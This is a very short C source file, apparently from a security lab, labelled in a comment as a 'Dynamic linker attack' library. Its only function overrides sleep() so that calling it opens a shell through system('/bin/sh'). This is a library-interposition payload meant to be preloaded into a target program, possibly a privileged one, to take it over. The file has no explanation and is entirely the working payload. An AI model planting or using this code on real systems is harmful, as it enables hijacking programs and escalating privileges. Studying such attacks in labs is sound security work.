#include <stdio.h>
#include <stdlib.h>

/* Dynamic linker attack
* user's lib
*/

void sleep(int s)
{
	system("/bin/sh");
}